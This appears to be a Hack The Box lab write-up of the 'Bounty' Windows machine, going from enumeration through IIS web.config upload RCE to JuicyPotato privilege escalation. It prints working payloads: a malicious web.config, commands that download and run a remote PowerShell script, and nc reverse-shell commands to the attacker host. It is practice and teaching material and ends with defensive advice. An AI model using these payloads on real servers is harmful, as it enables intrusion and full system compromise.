# HTB - Bounty

**IP Address:** `10.10.10.93`  
**OS:** Windows  
**Difficulty:** Easy  
**Tags:** #IIS, #ASP.NET, #FileUpload, #web.config, #JuicyPotato, #RCE

---
## Synopsis

Bounty is an easy Windows machine running IIS with an ASP.NET application vulnerable to insecure file upload handling.  
By uploading a crafted `web.config` file, it is possible to achieve Remote Code Execution (RCE).  
Privilege escalation is achieved by abusing the `SeImpersonatePrivilege` with **JuicyPotato**, leading to full SYSTEM access.

---
## Skills Required

- Basic web fuzzing and enumeration  
- Knowledge of IIS and ASP.NET file handling  
- Familiarity with privilege escalation using JuicyPotato  

## Skills Learned

- Identifying valid file extensions for uploads  
- Abusing `web.config` to achieve RCE in IIS  
- Using Nishang payloads to obtain a reverse shell  
- Leveraging `SeImpersonatePrivilege` to escalate privileges  

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

```bash
ping -c 1 10.10.10.93
```

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/ping.png]]

The host responds, confirming it is reachable.

---
### 1.2 Port Scanning

We perform a full TCP scan to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.93 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/allports.png]]

Extract the open ports:

```bash
extractPorts allPorts
```

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/extractports.png]]

---
### 1.3 Targeted Scan

Run a deeper scan with service/version detection and default scripts:

```bash
nmap -sCV -p80 10.10.10.93 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted -l java
```

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/targeted.png]]

**Findings:**

| Port | Service | Version/Description |
|------|---------|---------------------|
| 80   | HTTP    | Microsoft IIS running ASP.NET |

At this stage, we know the attack surface is a web application running on IIS with ASP.NET.

---
## 2. Web Enumeration

We first identify the web technology using **WhatWeb**:

```bash
whatweb http://10.10.10.93
```

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/whatweb.png]]

The server runs **ASP.NET**, meaning valid file extensions will likely be `.aspx`.

We also try the `http-enum` script from Nmap:

```bash
nmap --script http-enum -p80 10.10.10.93 -oN webScan
```

![[webscan.png]]

No useful results were found. Let’s manually browse the site:

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/web.png]]

The site only shows a static image of Merlin.

#### 2.1 Directory Fuzzing

Using **wfuzz** with SecLists dictionary let’s try fuzzing for `.aspx` files:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,asp-aspx http://10.10.10.93/FUZZ.FUZ2Z
```

![[wfuzz_aspx.png]]

We discover **transfer.aspx**.

#### 2.2 File Upload Functionality

Accessing `transfer.aspx` reveals a file upload form:

![[web_transfer.png]]

Testing with a simple file (`test.py`) fails:

![[web_transfer_test.png]]  
![[web_transfer_test_failed.png]]

We need to identify valid extensions. A custom Python script was used to fuzz valid upload extensions:

![[fuzzing_extension.png]]

The most interesting is **`.config`**.

---
## 3. Exploitation

### 3.1 web.config Exploit

On IIS, uploading a crafted `web.config` can allow RCE. We prepare a malicious file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
Response.write(1+2)
%>
-->
```

![[web_config_3.png]]

Upload it:

![[web_transfer_webconfig.png]]  
![[web_transfer_webconfig_true.png]]

### 3.2 Finding Upload Location

We fuzz upload paths with a custom dictionary:

```bash
cat /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | grep -i upload > dictionary
wfuzz -c --hc=404 -t 200 -w dictionary http://10.10.10.93/FUZZ
```

![[wfuzz_uploadedfiles.png]]

The directory is `/uploadedFiles/`.

![[web_uploadedfiles.png]]

Accessing `uploadedFiles/web.config` shows output, confirming **RCE**:

![[web_3.png]]

### 3.3 Remote Command Execution

We replace payload to confirm execution with ping:

```asp
<%
Set co = CreateObject("WScript.SHell")
Set cte = co.Exec("cmd /c ping 10.10.14.7")
output = cte.StdOut.Readall()
Response.write(output)
%>
```

![[webconfig_ping.png]]

Listening with tcpdump:

```bash
tcpdump -i tun0 icmp -n
```

![[webconfig_ping_received.png]]

✅ Confirmed RCE.

### 3.4 Reverse Shell

We use **Nishang Invoke-PowerShellTcp.ps1** payload:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443
```

Modify `web.config` to fetch and execute it:

```asp
<%
Set co = CreateObject("WScript.SHell")
Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PS.ps1')")
output = cte.StdOut.Readall()
Response.write(output)
%>
```

![[webconfig_shell.png]]

Start listener:

```bash
nc -nlvp 443
```

Upload and trigger the payload:

![[shell_received.png]]

✅ Reverse shell obtained as `merlin`.

---
## 4. Privilege Escalation

### 4.1 User Flag

The flag is hidden but retrievable with:

```bash
dir -Force
```

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/user_flag.png]]

🏁 **User flag obtained**

---
### 4.2 Escalation with JuicyPotato

Check privileges:

```bash
whoami /priv
```

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/user_priv.png]]

We have **SeImpersonatePrivilege**.

Upload **JuicyPotato (JP.exe)** and `nc.exe`:

```bash
python3 -m http.server 80
certutil.exe -f -urlcache -split http://10.10.14.7:80/nc.exe
certutil.exe -f -urlcache -split http://10.10.14.7:80/JP.exe
```

![[nc_&_JP_uploaded.png]]

Start listener:

```bash
nc -lvp 4646
```

Execute JuicyPotato:

```bash
.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.7 4646"
```

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/executing_JP.png]]

### 4.3 Root Flag

![[GitHub Documentation/EASY/HTB_Bounty_Writeup/screenshots/root_flag.png]]

🏁 **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Web Enumeration** → Found upload form at `transfer.aspx`.  
2. **Extension Fuzzing** → `.config` accepted.  
3. **web.config Upload** → Achieved RCE.  
4. **Reverse Shell** → Using Nishang payload.  
5. **Privilege Escalation** → Exploited `SeImpersonatePrivilege` with JuicyPotato.  
6. **Root Access** → Obtained SYSTEM shell.

---
## Defensive Recommendations

- Restrict allowed file extensions for uploads.  
- Prevent `.config` files from being uploaded/executed.  
- Apply principle of least privilege to Windows accounts.  
- Monitor for abuse of `SeImpersonatePrivilege`.  
- Regularly audit IIS configurations and enforce security best practices.  
